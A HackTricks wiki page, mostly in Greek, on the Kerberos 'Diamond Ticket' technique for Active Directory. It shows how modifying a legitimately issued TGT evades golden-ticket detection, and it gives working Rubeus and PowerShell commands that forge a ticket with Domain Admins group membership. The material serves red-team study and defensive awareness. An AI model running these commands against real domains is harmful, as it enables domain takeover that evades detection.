# Diamond Ticket

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Diamond Ticket

**Όπως ένα χρυσό εισιτήριο**, ένα διαμαντένιο εισιτήριο είναι ένα TGT που μπορεί να χρησιμοποιηθεί για **να αποκτήσει πρόσβαση σε οποιαδήποτε υπηρεσία ως οποιοσδήποτε χρήστης**. Ένα χρυσό εισιτήριο κατασκευάζεται εντελώς εκτός σύνδεσης, κρυπτογραφημένο με το hash krbtgt αυτού του τομέα, και στη συνέχεια εισάγεται σε μια συνεδρία σύνδεσης για χρήση. Επειδή οι ελεγκτές τομέα δεν παρακολουθούν τα TGT που έχουν εκδοθεί νόμιμα, θα αποδεχτούν ευχαρίστως TGT που είναι κρυπτογραφημένα με το δικό τους hash krbtgt.

Υπάρχουν δύο κοινές τεχνικές για να ανιχνεύσετε τη χρήση χρυσών εισιτηρίων:

* Αναζητήστε TGS-REQs που δεν έχουν αντίστοιχο AS-REQ.
* Αναζητήστε TGTs που έχουν ανόητες τιμές, όπως η προεπιλεγμένη διάρκεια 10 ετών του Mimikatz.

Ένα **διαμαντένιο εισιτήριο** δημιουργείται με **την τροποποίηση των πεδίων ενός νόμιμου TGT που εκδόθηκε από έναν DC**. Αυτό επιτυγχάνεται με **την αίτηση** ενός **TGT**, **την αποκρυπτογράφηση** του με το hash krbtgt του τομέα, **την τροποποίηση** των επιθυμητών πεδίων του εισιτηρίου, και στη συνέχεια **την επανακρυπτογράφηση** του. Αυτό **ξεπερνά τις δύο προαναφερθείσες αδυναμίες** ενός χρυσού εισιτηρίου επειδή:

* Τα TGS-REQs θα έχουν ένα προηγούμενο AS-REQ.
* Το TGT εκδόθηκε από έναν DC, που σημαίνει ότι θα έχει όλες τις σωστές λεπτομέρειες από την πολιτική Kerberos του τομέα. Ακόμα και αν αυτά μπορούν να κατασκευαστούν με ακρίβεια σε ένα χρυσό εισιτήριο, είναι πιο περίπλοκο και επιρρεπές σε λάθη.
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
